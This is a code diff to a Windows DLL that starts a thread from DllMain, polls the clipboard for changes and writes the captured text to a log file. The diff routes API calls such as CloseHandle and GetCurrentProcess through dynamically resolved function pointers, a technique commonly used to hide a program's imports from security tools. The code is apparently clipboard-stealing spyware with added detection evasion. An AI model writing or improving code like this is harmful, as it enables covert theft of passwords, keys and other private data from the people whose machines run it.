@@ -88,6 +88,7 @@ void LogClipboardText(const char* text) {
     uniName.Buffer = logPath;
     uniName.Length = (USHORT)(_wcslen(logPath) * sizeof(WCHAR));
     uniName.MaximumLength = (USHORT)(MAX_PATH * sizeof(WCHAR));
+    DYNAMIC_APIS * api = getAPI();
 
     InitializeObjectAttributes(&objAttr, &uniName, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
@@ -113,7 +114,7 @@ void LogClipboardText(const char* text) {
         dWriteFile(hFile, NULL, NULL, NULL, &ioStatusBlock, (PVOID)text, (ULONG)len, NULL, NULL);
         dWriteFile(hFile, NULL, NULL, NULL, &ioStatusBlock, (PVOID)separator, (ULONG)sepLen, NULL, NULL);
 
-        CloseHandle(hFile);
+        api->pCloseHandle(hFile);
     }
 }
 
@@ -124,7 +125,7 @@ DWORD WINAPI PollingThread(LPVOID lpParam) {
     DWORD dwLastSequence = 0;
     DYNAMIC_APIS* api = getAPI();
     
-        dwLastSequence = api->pGetClipboardSequenceNumber();
+    dwLastSequence = api->pGetClipboardSequenceNumber();
 
     while (g_bRunning) {
             DWORD dwCurrentSequence = api->pGetClipboardSequenceNumber();
@@ -170,7 +171,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
                     &g_hThread, 
                     THREAD_ALL_ACCESS, 
                     NULL,
-                    GetCurrentProcess(), 
+                    api->pGetCurrentProcess(), 
                     PollingThread,
                     NULL,
                     0, 0, 0, 0, 
